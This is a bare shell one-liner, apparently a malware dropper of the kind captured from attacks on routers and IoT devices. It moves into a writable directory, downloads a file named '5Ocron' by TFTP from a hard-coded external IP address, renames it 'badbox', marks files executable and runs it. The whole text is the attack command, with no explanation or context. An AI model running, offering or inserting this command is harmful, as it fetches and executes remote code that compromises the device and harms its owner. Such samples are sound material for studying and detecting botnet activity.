cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 93.158.200.65 -c get 5Ocron;cat 5Ocron >badbox;chmod +x *;./badbox
